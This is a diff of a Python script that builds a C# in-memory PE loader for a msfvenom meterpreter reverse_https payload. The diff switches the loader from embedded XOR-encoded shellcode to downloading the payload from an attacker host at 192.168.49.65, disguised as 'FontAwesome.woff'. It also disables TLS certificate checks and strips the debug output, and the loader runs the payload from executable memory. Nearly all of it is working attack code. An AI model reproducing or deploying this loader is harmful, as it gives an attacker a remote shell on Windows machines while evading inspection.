@@ -1,26 +1,17 @@
 #!/bin/env python3
+from ak import *
 import os
 import subprocess
 import base64
 
 LHOST = "192.168.49.65"
 LPORT = 443
-OUT_FILENAME = 'win_peloader.exe'
-TMP_FILENAME = 'win_peloader.cs'
+BASE_FILENAME = 'win_peloader'
 MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f exe -e generic/none"
+XOR_KEY = b'\x09'
+STAGER_URL = "http://192.168.49.65/FontAwesome.woff"
 
-def get_shellcode(msfvenom_cmd):
-  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)
-
-  return shellcode
-
-def enc_shellcode(shellcode):
-  key = bytearray(b'\x09') * len(shellcode)
-  return [ a ^ b for (a,b) in zip(shellcode, key) ] 
-
-def generate(xor_shellcode):
-  xor_shellcode_hex = ",".join("0x%02x" % b for b in xor_shellcode)
-
+def generate(shellcode):
   template = """
 using System;
 using System.IO;
@@ -57,22 +48,24 @@ namespace PELoader
                 return;
             }}
 
-	    byte[] unpacked = {{ {xor_shellcode_hex} }};
+	    //byte[] unpacked = {{ {xor_shellcode_hex} }};
+
+            string url = "{stager_url}";
+
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] unpacked = client.DownloadData(url);
 
             for (int i = 0; i < unpacked.Length; i++)
             {{
-                unpacked[i] = (byte)(((uint)unpacked[i] ^ 0x09) & 0xFF);
+                unpacked[i] = (byte)(((uint)unpacked[i] ^ {xor_key}) & 0xFF);
             }}
             
             PELoader pe = new PELoader(unpacked);
 
-            Console.WriteLine("Preferred Load Address = {{0}}", pe.OptionalHeader64.ImageBase.ToString("X4"));
-
             IntPtr codebase = IntPtr.Zero;
 
             codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
-
-            Console.WriteLine("Allocated Space For {{0}} at {{1}}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
 
             //Copy Sections
             for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
@@ -80,32 +73,16 @@ namespace PELoader
 
                 IntPtr y = NativeDeclarations.VirtualAlloc(IntPtr.Add(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                 Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
-                Console.WriteLine("Section {{0}}, Copied To {{1}}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
             }}
 
-            //Perform Base Relocation
-            //Calculate Delta
             long currentbase = (long)codebase.ToInt64();
             long delta;
 
             delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);
-
-
-            Console.WriteLine("Delta = {{0}}", delta.ToString("X4"));
-
-            //Modify Memory Based On Relocation Table
-
-            //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.VirtualAddress.ToString("X4"));
-            //Console.WriteLine(pe.OptionalHeader64.BaseRelocationTable.Size.ToString("X4"));
-
             IntPtr relocationTable = (IntPtr.Add(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
-            //Console.WriteLine(relocationTable.ToString("X4"));
 
             NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
             relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
-            //Console.WriteLine(relocationEntry.VirtualAdress.ToString("X4"));
-            //Console.WriteLine(relocationEntry.SizeOfBlock.ToString("X4"));
-
             int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
             IntPtr nextEntry = relocationTable;
             int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
@@ -121,10 +98,6 @@ namespace PELoader
 
                 IntPtr dest = IntPtr.Add(codebase, (int)relocationEntry.VirtualAdress);
 
-
-                //Console.WriteLine("Section Has {{0}} Entires",(int)(relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) /2);
-                //Console.WriteLine("Next Section Has {{0}} Entires", (int)(relocationNextEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
-
                 for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                 {{
 
@@ -133,7 +106,6 @@ namespace PELoader
 
                     UInt16 type = (UInt16)(value >> 12);
                     UInt16 fixup = (UInt16)(value & 0xfff);
-                    //Console.WriteLine("{{0}}, {{1}}, {{2}}", value.ToString("X4"), type.ToString("X4"), fixup.ToString("X4"));
 
                     switch (type)
                     {{
@@ -179,12 +151,10 @@ namespace PELoader
                 if (DllName == "") {{ break; }}
 
                 IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
-                Console.WriteLine("Loaded {{0}}", DllName);
                 for (int k = 1; k < 9999; k++)
                 {{
                     IntPtr dllFuncNamePTR = (IntPtr.Add(codebase, +Marshal.ReadInt32(a2)));
                     string DllFuncName = Marshal.PtrToStringAnsi(IntPtr.Add(dllFuncNamePTR, 2));
-                    //Console.WriteLine("Function {{0}}", DllFuncName);
                     IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                     Marshal.WriteInt64(a2, (long)funcAddy);
                     a2 = IntPtr.Add(a2, 8);
@@ -195,12 +165,10 @@ namespace PELoader
             }}
 
             //Transfer Control To OEP
-            Console.WriteLine("Executing loaded PE");
             IntPtr threadStart = IntPtr.Add(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
             IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
             NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-            Console.WriteLine("Thread Complete");
             //Console.ReadLine();
 
         }} //End Main
@@ -636,26 +604,33 @@ namespace PELoader
 
     }}
 }}
-  """.format(xor_shellcode_hex=xor_shellcode_hex)
+  """.format(xor_shellcode_hex=shellcode.get_hex_csharp(), xor_key=shellcode.get_key_csharp(), stager_url=STAGER_URL)
 
   print(template)
-  f = open(TMP_FILENAME, "w")
+  f = open(BASE_FILENAME + ".cs", "w")
   f.write(template)
   f.close()
 
+  print("Wrote to: "+BASE_FILENAME + ".cs")
+
+  f = open(BASE_FILENAME + ".xsc", "wb")
+  f.write(shellcode.get_bytes())
+  f.close()
+
+  print("Wrote to: "+BASE_FILENAME + ".xsc")
+
 
 def compile():
-  cmd = f"mcs /unsafe /out:{OUT_FILENAME} {TMP_FILENAME}"
+  cmd = f"mcs /unsafe {BASE_FILENAME}.cs"
   os.system(cmd)
+  print("Wrote to: "+BASE_FILENAME + '.exe')
 
 def main():
-  shellcode = get_shellcode(MSFVENOM_CMD)
-  xor_shellcode = enc_shellcode(shellcode)
-
-  generate(xor_shellcode)
+  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
+  generate(shellcode)
   compile() 
 
-  assert(bytearray(shellcode) == bytearray(enc_shellcode(xor_shellcode)))
+  print("Serve from: "+STAGER_URL)
 
 
 if __name__ == "__main__":
